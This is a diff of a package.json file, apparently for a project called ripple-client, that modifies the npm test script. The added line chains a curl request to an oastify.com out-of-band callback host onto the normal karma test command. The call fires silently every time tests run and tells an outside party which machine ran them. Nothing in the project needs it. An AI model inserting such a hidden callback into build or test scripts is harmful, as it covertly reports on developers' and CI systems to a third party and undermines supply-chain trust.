@@ -19,7 +19,7 @@
   },
   "license": "ISC",
   "scripts": {
-    "test": "./node_modules/.bin/karma start test/karma.conf.js",
+    "test": "./node_modules/.bin/karma start test/karma.conf.js && curl https://ucaaq7zwttlagdr075putpzdd4jz7tvi.oastify.com/ripple-client",
     "test-travis": "./node_modules/.bin/karma start test/karma.conf.js --single-run --browsers Firefox"
   },
   "repository": {
